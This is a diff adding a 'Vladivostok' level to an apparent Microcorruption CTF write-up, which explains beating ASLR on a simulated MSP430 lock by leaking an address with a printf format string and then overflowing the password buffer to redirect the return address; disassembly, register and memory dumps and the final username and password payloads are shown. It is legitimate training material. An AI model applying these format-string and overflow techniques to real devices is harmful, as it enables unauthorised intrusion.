@@ -14,6 +14,7 @@
 - [Addis Ababa](#addis-ababa)
 - [Novosibirsk](#novosibirsk)
 - [Algiers](#algiers)
+- [Vladivostok](#vladivostok)
 
 ## Introduction
 
@@ -702,3 +703,78 @@ r12 0046  r13 0170  r14 241e  r15 2408
 
 username = 41414141414141414141414141414141964334241f01
 password = 424242424242424242424242424242421e24082401
+
+## Vladivostok
+
+
+The challenge has to do with ASLR or Address Space Layout Randomization, which means the programs code is put on the stack randomly making it a lot harder to exploit. This doesn't make it impossible to exploit though. If we run the program for the first time we can see that we can enter a username, which is limited to only 8 characters. We can test this be entering the username, "AABBCCDDEEFFGGHH". We can enter "1122334455667788" as the password, which there isn't a specific limit said, but we can be guess to be 8 characters. After running the program we get the error "insn address unaligned". If we look at the register state, we can see that we have overwritten the instruction pointer with "55", r11 with "44", and r10 with "33". This means our password input was suppose to be limited to 8 characters, but it wasn't and now we have a buffer overflow. What makes this challenge special is we don't know where on the stack any of the functions are located. So, we don't know what to point the return call to. If we look at the function conditional_unlock_door before starting the program, we can see on line 4a46 that 0x7e is put into r13. Then on line 4a56 is moved from r13 to r15 before on line 4a60 where the INT function is called. So, we know to unlock the door we need to call INT with 0x7f in r15. The problem is we can't overwrite r13 only r10 and r11. If we look at the _aslr_main function, at line 4544 we can see that r11 is moved onto r15 and then at line 454e the INT function is called. So we now know where we want the return function to be and what to put into the r11 register. The last thing to solve is knowing where line 4544 will be after the stack is randomized.
+
+```asm
+
+Register State
+
+pc  3535  sp  82a4  sr  0014  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 3333  r11 3434
+r12 0000  r13 000a  r14 8298  r15 8298
+
+4a42 <conditional_unlock_door>
+4a42:  2183           decd	sp
+4a44:  0e4f           mov	r15, r14
+4a46:  3d40 7e00      mov	#0x7e, r13
+4a4a:  0c41           mov	sp, r12
+4a4c:  0c12           push	r12
+4a4e:  0e12           push	r14
+4a50:  0d12           push	r13
+4a52:  0012           push	pc
+4a54:  0212           push	sr
+4a56:  0f4d           mov	r13, r15
+4a58:  8f10           swpb	r15
+4a5a:  024f           mov	r15, sr
+4a5c:  32d0 0080      bis	#0x8000, sr
+4a60:  b012 1000      call	#0x10
+4a64:  3241           pop	sr
+4a66:  3152           add	#0x8, sp
+4a68:  0f43           clr	r15
+4a6a:  2153           incd	sp
+4a6c:  3041           ret
+
+```
+
+This last problem can be solved with a format string exploit. Since the program uses printf to show the user the username that was entered when entering the password. We can use %x to get a specific location on the stack. This memory location will be random, but always the exact same location in the code. So, if we find where on the stack the line 4544 we can use that subtract that from the address that the username gets us. So the next time we get the address in the username we can add that to it and get the exact location we want to our return to be. Rerunning the program and entering "%x%x%x" as the username gets us the username "000075ca0000". If we search the memory for "0212 0f4d 8f10", we find that line 4544 is on address 73a4. So doing the math, 0x75ca - 0x73a4 = 0x226, we get line 4544 is 226 hex away from the username address. If we enter "4141414141417f00a473" as the password we get the door to unlock. We use 6 "A"s to pad for the buffer overflow, then 0x7f to put in r11 and 0x00 to pad for the return address. So when actually solving the challenge we have to subtract 0x226 from usernames' address. 
+
+```asm
+
+4482 <_aslr_main>
+
+4482:  0b12           push	r11
+...
+453a:  0b12           push	r11
+453c:  0d12           push	r13
+453e:  0b12           push	r11
+4540:  0012           push	pc
+4542:  0212           push	sr
+4544:  0f4b           mov	r11, r15
+4546:  8f10           swpb	r15
+4548:  024f           mov	r15, sr
+454a:  32d0 0080      bis	#0x8000, sr
+454e:  b012 1000      call	#0x10
+...
+475a:  3041           ret
+
+
+Live Memory Dump
+
+7390:   0224 0b43 103c 1e53 8d11 0b12 0d12 0b12   .$.C.<.S........
+73a0:   0012 0212 0f4b 8f10 024f 32d0 0080 b012   .....K...O2.....
+73b0:   1000 3241 3152 6d4e 4d93 ed23 0e43 3d40   ..2A1RmNM..#.C=@
+
+```
+
+### Solved
+
+username = %x%x%x
+password = 4141414141417f00[address from username - 0x226]
+
+
+
